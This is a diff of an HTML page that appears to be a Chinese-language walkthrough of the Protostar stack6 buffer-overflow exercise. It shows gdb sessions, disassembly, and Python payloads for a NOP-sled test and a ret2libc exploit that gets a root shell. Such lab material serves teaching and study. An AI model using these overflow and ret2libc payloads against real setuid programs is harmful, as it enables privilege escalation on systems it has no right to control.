+0x080484d0<span class="w"> </span>&lt;getpath+76&gt;:<span class="w">    </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x080484d3<span class="w"> </span>&lt;getpath+79&gt;:<span class="w">    </span>call<span class="w">   </span>0x80483c0<span class="w"> </span>&lt;printf@plt&gt;
+0x080484d8<span class="w"> </span>&lt;getpath+84&gt;:<span class="w">    </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x1
+0x080484df<span class="w"> </span>&lt;getpath+91&gt;:<span class="w">    </span>call<span class="w">   </span>0x80483a0<span class="w"> </span>&lt;_exit@plt&gt;
+0x080484e4<span class="w"> </span>&lt;getpath+96&gt;:<span class="w">    </span>mov<span class="w">    </span>eax,0x80485f0
+0x080484e9<span class="w"> </span>&lt;getpath+101&gt;:<span class="w">   </span>lea<span class="w">    </span>edx,<span class="o">[</span>ebp-0x4c<span class="o">]</span>
+0x080484ec<span class="w"> </span>&lt;getpath+104&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp+0x4<span class="o">]</span>,edx
+0x080484f0<span class="w"> </span>&lt;getpath+108&gt;:<span class="w">   </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,eax
+0x080484f3<span class="w"> </span>&lt;getpath+111&gt;:<span class="w">   </span>call<span class="w">   </span>0x80483c0<span class="w"> </span>&lt;printf@plt&gt;
+0x080484f8<span class="w"> </span>&lt;getpath+116&gt;:<span class="w">   </span>leave<span class="w">  </span>
+0x080484f9<span class="w"> </span>&lt;getpath+117&gt;:<span class="w">   </span>ret<span class="w">    </span>
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
 </code></pre></div>
 </details>
 <div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">struct</span>
@@ -3397,48 +3411,48 @@ End of assembler dump.
 <span class="n">nop</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">64</span>
 <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">80</span> <span class="o">+</span> <span class="n">ret</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">nop</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\xcc</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="c1"># just to hit the break point</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>$ python /tmp/stack.py &gt; /tmp/break
-$ gdb ./stack6
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x080484f9
-Breakpoint <span class="m">1</span> at 0x80484f9: file stack6/stack6.c, line <span class="m">23</span>.
-<span class="o">(</span>gdb<span class="o">)</span> define hook-stop
-Type commands <span class="k">for</span> definition of <span class="s2">&quot;hook-stop&quot;</span>.
-End with a line saying just <span class="s2">&quot;end&quot;</span>.
-&gt;x/1i <span class="nv">$eip</span>
-&gt;x/8wx <span class="nv">$esp</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>python<span class="w"> </span>/tmp/stack.py<span class="w"> </span>&gt;<span class="w"> </span>/tmp/break
+$<span class="w"> </span>gdb<span class="w"> </span>./stack6
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">break</span><span class="w"> </span>*0x080484f9
+Breakpoint<span class="w"> </span><span class="m">1</span><span class="w"> </span>at<span class="w"> </span>0x80484f9:<span class="w"> </span>file<span class="w"> </span>stack6/stack6.c,<span class="w"> </span>line<span class="w"> </span><span class="m">23</span>.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>define<span class="w"> </span>hook-stop
+Type<span class="w"> </span>commands<span class="w"> </span><span class="k">for</span><span class="w"> </span>definition<span class="w"> </span>of<span class="w"> </span><span class="s2">&quot;hook-stop&quot;</span>.
+End<span class="w"> </span>with<span class="w"> </span>a<span class="w"> </span>line<span class="w"> </span>saying<span class="w"> </span>just<span class="w"> </span><span class="s2">&quot;end&quot;</span>.
+&gt;x/1i<span class="w"> </span><span class="nv">$eip</span>
+&gt;x/8wx<span class="w"> </span><span class="nv">$esp</span>
 &gt;end
-<span class="o">(</span>gdb<span class="o">)</span> r &lt; /tmp/break 
-Starting program: /opt/protostar/bin/stack6 &lt; /tmp/break
-input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�aaaaaaaaaaaa�������������������������������������������������������������������������
-0x80484f9 &lt;getpath+117&gt;:    ret    
-0xbffff69c: 0x080484f9  0xbffff6c0  0x90909090  0x90909090
-0xbffff6ac: 0x90909090  0x90909090  0x90909090  0x90909090
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span>&lt;<span class="w"> </span>/tmp/break<span class="w"> </span>
+Starting<span class="w"> </span>program:<span class="w"> </span>/opt/protostar/bin/stack6<span class="w"> </span>&lt;<span class="w"> </span>/tmp/break
+input<span class="w"> </span>path<span class="w"> </span>please:<span class="w"> </span>got<span class="w"> </span>path<span class="w"> </span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�aaaaaaaaaaaa�������������������������������������������������������������������������
+0x80484f9<span class="w"> </span>&lt;getpath+117&gt;:<span class="w">    </span>ret<span class="w">    </span>
+0xbffff69c:<span class="w"> </span>0x080484f9<span class="w">  </span>0xbffff6c0<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090
+0xbffff6ac:<span class="w"> </span>0x90909090<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090
 
-Breakpoint <span class="m">1</span>, 0x080484f9 <span class="k">in</span> getpath <span class="o">()</span> at stack6/stack6.c:23
-<span class="m">23</span>  stack6/stack6.c: No such file or directory.
-  <span class="k">in</span> stack6/stack6.c
-<span class="o">(</span>gdb<span class="o">)</span> si
-0x80484f9 &lt;getpath+117&gt;:    ret <span class="c1"># ret again, because we jump to it</span>
-0xbffff6a0: 0xbffff6c0  0x90909090  0x90909090  0x90909090
-0xbffff6b0: 0x90909090  0x90909090  0x90909090  0x90909090
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x080484f9<span class="w"> </span><span class="k">in</span><span class="w"> </span>getpath<span class="w"> </span><span class="o">()</span><span class="w"> </span>at<span class="w"> </span>stack6/stack6.c:23
+<span class="m">23</span><span class="w">  </span>stack6/stack6.c:<span class="w"> </span>No<span class="w"> </span>such<span class="w"> </span>file<span class="w"> </span>or<span class="w"> </span>directory.
+<span class="w">  </span><span class="k">in</span><span class="w"> </span>stack6/stack6.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>si
+0x80484f9<span class="w"> </span>&lt;getpath+117&gt;:<span class="w">    </span>ret<span class="w"> </span><span class="c1"># ret again, because we jump to it</span>
+0xbffff6a0:<span class="w"> </span>0xbffff6c0<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090
+0xbffff6b0:<span class="w"> </span>0x90909090<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090
 
-Breakpoint <span class="m">1</span>, 0x080484f9 <span class="k">in</span> getpath <span class="o">()</span> at stack6/stack6.c:23
-<span class="m">23</span>  <span class="k">in</span> stack6/stack6.c
-<span class="o">(</span>gdb<span class="o">)</span> 
-Cannot access memory at address 0x61616165
-<span class="o">(</span>gdb<span class="o">)</span> 
-0xbffff6c1: nop
-0xbffff6a4: 0x90909090  0x90909090  0x90909090  0x90909090
-0xbffff6b4: 0x90909090  0x90909090  0x90909090  0x90909090
-0xbffff6c1 <span class="k">in</span> ?? <span class="o">()</span>
-<span class="o">(</span>gdb<span class="o">)</span> c
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x080484f9<span class="w"> </span><span class="k">in</span><span class="w"> </span>getpath<span class="w"> </span><span class="o">()</span><span class="w"> </span>at<span class="w"> </span>stack6/stack6.c:23
+<span class="m">23</span><span class="w">  </span><span class="k">in</span><span class="w"> </span>stack6/stack6.c
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>
+Cannot<span class="w"> </span>access<span class="w"> </span>memory<span class="w"> </span>at<span class="w"> </span>address<span class="w"> </span>0x61616165
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>
+0xbffff6c1:<span class="w"> </span>nop
+0xbffff6a4:<span class="w"> </span>0x90909090<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090
+0xbffff6b4:<span class="w"> </span>0x90909090<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090
+0xbffff6c1<span class="w"> </span><span class="k">in</span><span class="w"> </span>??<span class="w"> </span><span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
 Continuing.
 
-Program received signal SIGTRAP, Trace/breakpoint trap.
-0xbffff6e5: int3   
-0xbffff6a4: 0x90909090  0x90909090  0x90909090  0x90909090
-0xbffff6b4: 0x90909090  0x90909090  0x90909090  0x90909090
-0xbffff6e5 <span class="k">in</span> ?? <span class="o">()</span>
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGTRAP,<span class="w"> </span>Trace/breakpoint<span class="w"> </span>trap.
+0xbffff6e5:<span class="w"> </span>int3<span class="w">   </span>
+0xbffff6a4:<span class="w"> </span>0x90909090<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090
+0xbffff6b4:<span class="w"> </span>0x90909090<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090<span class="w">  </span>0x90909090
+0xbffff6e5<span class="w"> </span><span class="k">in</span><span class="w"> </span>??<span class="w"> </span><span class="o">()</span>
 </code></pre></div>
 </li>
 </ul>
@@ -3448,32 +3462,32 @@ Program received signal SIGTRAP, Trace/breakpoint trap.
 <ul>
 <li>
 <p><code>system</code> 是 <code>libc</code> 函数，能够执行 <code>shell</code> 命令</p>
-<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
 
-<span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
+<span class="p">}</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>$ gcc sys.c -o sys
-$ ./sys 
-$ id
-<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span>
-$ <span class="nb">exit</span>
-$ gdb ./sys
-<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set</span> disassembly-flavor intel
-<span class="o">(</span>gdb<span class="o">)</span> disassemble main 
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> main:
-0x080483c4 &lt;main+0&gt;:    push   ebp
-0x080483c5 &lt;main+1&gt;:    mov    ebp,esp
-0x080483c7 &lt;main+3&gt;:    and    esp,0xfffffff0
-0x080483ca &lt;main+6&gt;:    sub    esp,0x10
-0x080483cd &lt;main+9&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x80484a0 <span class="c1"># 需执行的命令入栈</span>
-0x080483d4 &lt;main+16&gt;:   call   0x80482ec &lt;system@plt&gt; <span class="c1"># 调用函数会将 call 的下一条指令地址入栈</span>
-0x080483d9 &lt;main+21&gt;:   leave  
-0x080483da &lt;main+22&gt;:   ret    
-End of assembler dump.
-<span class="o">(</span>gdb<span class="o">)</span> x/s 0x80484a0
-0x80484a0:   <span class="s2">&quot;/bin/sh&quot;</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>gcc<span class="w"> </span>sys.c<span class="w"> </span>-o<span class="w"> </span>sys
+$<span class="w"> </span>./sys<span class="w"> </span>
+$<span class="w"> </span>id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span>
+$<span class="w"> </span><span class="nb">exit</span>
+$<span class="w"> </span>gdb<span class="w"> </span>./sys
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="nb">set</span><span class="w"> </span>disassembly-flavor<span class="w"> </span>intel
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>disassemble<span class="w"> </span>main<span class="w"> </span>
+Dump<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>code<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">function</span><span class="w"> </span>main:
+0x080483c4<span class="w"> </span>&lt;main+0&gt;:<span class="w">    </span>push<span class="w">   </span>ebp
+0x080483c5<span class="w"> </span>&lt;main+1&gt;:<span class="w">    </span>mov<span class="w">    </span>ebp,esp
+0x080483c7<span class="w"> </span>&lt;main+3&gt;:<span class="w">    </span>and<span class="w">    </span>esp,0xfffffff0
+0x080483ca<span class="w"> </span>&lt;main+6&gt;:<span class="w">    </span>sub<span class="w">    </span>esp,0x10
+0x080483cd<span class="w"> </span>&lt;main+9&gt;:<span class="w">    </span>mov<span class="w">    </span>DWORD<span class="w"> </span>PTR<span class="w"> </span><span class="o">[</span>esp<span class="o">]</span>,0x80484a0<span class="w"> </span><span class="c1"># 需执行的命令入栈</span>
+0x080483d4<span class="w"> </span>&lt;main+16&gt;:<span class="w">   </span>call<span class="w">   </span>0x80482ec<span class="w"> </span>&lt;system@plt&gt;<span class="w"> </span><span class="c1"># 调用函数会将 call 的下一条指令地址入栈</span>
+0x080483d9<span class="w"> </span>&lt;main+21&gt;:<span class="w">   </span>leave<span class="w">  </span>
+0x080483da<span class="w"> </span>&lt;main+22&gt;:<span class="w">   </span>ret<span class="w">    </span>
+End<span class="w"> </span>of<span class="w"> </span>assembler<span class="w"> </span>dump.
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/s<span class="w"> </span>0x80484a0
+0x80484a0:<span class="w">   </span><span class="s2">&quot;/bin/sh&quot;</span>
 </code></pre></div>
 </li>
 <li>
@@ -3499,36 +3513,36 @@ End of assembler dump.
 <p>可以借助 <code>libc</code> 传递所需的命令字符串</p>
 <div class="highlight"><pre><span></span><code><span class="c1"># 获取 /bin/sh 在 libc 中的 offset</span>
 <span class="c1"># -t x: Print the location of the string in hex</span>
-$ strings -a -t x /lib/libc-2.11.2.so <span class="p">|</span> grep <span class="s2">&quot;/bin/sh&quot;</span>
-11f3bf /bin/sh
-$ gdb ./stack6
+$<span class="w"> </span>strings<span class="w"> </span>-a<span class="w"> </span>-t<span class="w"> </span>x<span class="w"> </span>/lib/libc-2.11.2.so<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span>
+11f3bf<span class="w"> </span>/bin/sh
+$<span class="w"> </span>gdb<span class="w"> </span>./stack6
 ...
-<span class="o">(</span>gdb<span class="o">)</span> p system  <span class="c1"># system 的地址</span>
-<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7ecffb0 &lt;__libc_system&gt;
-<span class="o">(</span>gdb<span class="o">)</span> info proc map
-process <span class="m">3986</span>
-<span class="nv">cmdline</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/stack6&#39;</span>
-<span class="nv">cwd</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin&#39;</span>
-<span class="nv">exe</span> <span class="o">=</span> <span class="s1">&#39;/opt/protostar/bin/stack6&#39;</span>
-Mapped address spaces:
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>p<span class="w"> </span>system<span class="w">  </span><span class="c1"># system 的地址</span>
+<span class="nv">$1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span>&lt;text<span class="w"> </span>variable,<span class="w"> </span>no<span class="w"> </span>debug<span class="w"> </span>info&gt;<span class="o">}</span><span class="w"> </span>0xb7ecffb0<span class="w"> </span>&lt;__libc_system&gt;
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>proc<span class="w"> </span>map
+process<span class="w"> </span><span class="m">3986</span>
+<span class="nv">cmdline</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/opt/protostar/bin/stack6&#39;</span>
+<span class="nv">cwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/opt/protostar/bin&#39;</span>
+<span class="nv">exe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/opt/protostar/bin/stack6&#39;</span>
+Mapped<span class="w"> </span>address<span class="w"> </span>spaces:
 
-  Start Addr   End Addr       Size     Offset objfile
-  0x8048000  0x8049000     0x1000          <span class="m">0</span>        /opt/protostar/bin/stack6
-  0x8049000  0x804a000     0x1000          <span class="m">0</span>        /opt/protostar/bin/stack6
-  0xb7e96000 0xb7e97000     0x1000          <span class="m">0</span>        
-  0xb7e97000 0xb7fd5000   0x13e000          <span class="m">0</span>         /lib/libc-2.11.2.so
-  0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
-  0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
-  0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
-  0xb7fd9000 0xb7fdc000     0x3000          <span class="m">0</span>        
-  0xb7fe0000 0xb7fe2000     0x2000          <span class="m">0</span>        
-  0xb7fe2000 0xb7fe3000     0x1000          <span class="m">0</span>           <span class="o">[</span>vdso<span class="o">]</span>
-  0xb7fe3000 0xb7ffe000    0x1b000          <span class="m">0</span>         /lib/ld-2.11.2.so
-  0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
-  0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
-  0xbffeb000 0xc0000000    0x15000          <span class="m">0</span>           <span class="o">[</span>stack<span class="o">]</span>
-<span class="o">(</span>gdb<span class="o">)</span> x/s 0xb7e97000+0x11f3bf <span class="c1"># offset 结合 libc 的起始地址可获得 /bin/sh 的地址</span>
-0xb7fb63bf:  <span class="s2">&quot;/bin/sh&quot;</span>
+<span class="w">  </span>Start<span class="w"> </span>Addr<span class="w">   </span>End<span class="w"> </span>Addr<span class="w">       </span>Size<span class="w">     </span>Offset<span class="w"> </span>objfile
+<span class="w">  </span>0x8048000<span class="w">  </span>0x8049000<span class="w">     </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">        </span>/opt/protostar/bin/stack6
+<span class="w">  </span>0x8049000<span class="w">  </span>0x804a000<span class="w">     </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">        </span>/opt/protostar/bin/stack6
+<span class="w">  </span>0xb7e96000<span class="w"> </span>0xb7e97000<span class="w">     </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">        </span>
+<span class="w">  </span>0xb7e97000<span class="w"> </span>0xb7fd5000<span class="w">   </span>0x13e000<span class="w">          </span><span class="m">0</span><span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd5000<span class="w"> </span>0xb7fd6000<span class="w">     </span>0x1000<span class="w">   </span>0x13e000<span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd6000<span class="w"> </span>0xb7fd8000<span class="w">     </span>0x2000<span class="w">   </span>0x13e000<span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd8000<span class="w"> </span>0xb7fd9000<span class="w">     </span>0x1000<span class="w">   </span>0x140000<span class="w">         </span>/lib/libc-2.11.2.so
+<span class="w">  </span>0xb7fd9000<span class="w"> </span>0xb7fdc000<span class="w">     </span>0x3000<span class="w">          </span><span class="m">0</span><span class="w">        </span>
+<span class="w">  </span>0xb7fe0000<span class="w"> </span>0xb7fe2000<span class="w">     </span>0x2000<span class="w">          </span><span class="m">0</span><span class="w">        </span>
+<span class="w">  </span>0xb7fe2000<span class="w"> </span>0xb7fe3000<span class="w">     </span>0x1000<span class="w">          </span><span class="m">0</span><span class="w">           </span><span class="o">[</span>vdso<span class="o">]</span>
+<span class="w">  </span>0xb7fe3000<span class="w"> </span>0xb7ffe000<span class="w">    </span>0x1b000<span class="w">          </span><span class="m">0</span><span class="w">         </span>/lib/ld-2.11.2.so
+<span class="w">  </span>0xb7ffe000<span class="w"> </span>0xb7fff000<span class="w">     </span>0x1000<span class="w">    </span>0x1a000<span class="w">         </span>/lib/ld-2.11.2.so
+<span class="w">  </span>0xb7fff000<span class="w"> </span>0xb8000000<span class="w">     </span>0x1000<span class="w">    </span>0x1b000<span class="w">         </span>/lib/ld-2.11.2.so
+<span class="w">  </span>0xbffeb000<span class="w"> </span>0xc0000000<span class="w">    </span>0x15000<span class="w">          </span><span class="m">0</span><span class="w">           </span><span class="o">[</span>stack<span class="o">]</span>
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/s<span class="w"> </span>0xb7e97000+0x11f3bf<span class="w"> </span><span class="c1"># offset 结合 libc 的起始地址可获得 /bin/sh 的地址</span>
+0xb7fb63bf:<span class="w">  </span><span class="s2">&quot;/bin/sh&quot;</span>
 </code></pre></div>
 </li>
 </ul>
@@ -3539,10 +3553,10 @@ Mapped address spaces:
 <span class="n">bin_sh</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I&quot;</span><span class="p">,</span> <span class="mh">0xb7fb63bf</span><span class="p">)</span>
 <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">80</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="n">ret_after_sys</span> <span class="o">+</span> <span class="n">bin_sh</span><span class="p">)</span> <span class="c1"># ret2libc</span>
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>$ <span class="o">(</span>python /tmp/stack.py<span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./stack6
-input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa���aaaaaaaaaaaa���AAAA�c��
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span><span class="o">(</span>python<span class="w"> </span>/tmp/stack.py<span class="p">;</span><span class="w"> </span>cat<span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>./stack6
+input<span class="w"> </span>path<span class="w"> </span>please:<span class="w"> </span>got<span class="w"> </span>path<span class="w"> </span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa���aaaaaaaaaaaa���AAAA�c��
 id
-<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>user<span class="o">)</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1001</span><span class="o">(</span>user<span class="o">)</span><span class="w"> </span><span class="nv">euid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>user<span class="o">)</span>
 whoami
 root
 </code></pre></div>
